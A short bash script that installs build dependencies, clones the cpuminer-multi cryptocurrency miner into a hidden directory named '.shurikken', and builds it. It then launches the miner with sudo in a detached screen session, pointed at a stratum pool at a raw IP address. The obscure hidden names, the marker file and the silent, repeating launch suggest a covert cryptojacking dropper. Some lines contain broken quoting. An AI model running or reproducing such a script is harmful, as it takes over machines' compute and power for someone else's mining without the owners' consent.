#!/bin/bash
if [ ! -f ~/.genebook ]; then
sudo apt-get update
sudo apt-get -y install libcurl4-openssl-dev build-essential libjansson-dev automake git
git clone https://github.com/wolf9466/cpuminer-multi .shurikken
echo "./autogen.sh" >> ~/.shurikken/moresteps.sh
echo "CFLAGS="-march=native" ./configure" >> ~/.shurikken/moresteps.sh
echo "make" >> ~/.shurikken/moresteps.sh
echo "screen -d -m sudo ./minerd -a cryptonight -o stratum+tcp://35.202.109.38:8081 -t 7" >> ~/.shurikken/run_shurikken.sh
cd .shurikken && bash ~/.shurikken/moresteps.sh
echo "not first run" >> ~/.genebook
fi
cd ~/.shurikken && bash ~/.shurikken/run_shurikken.sh
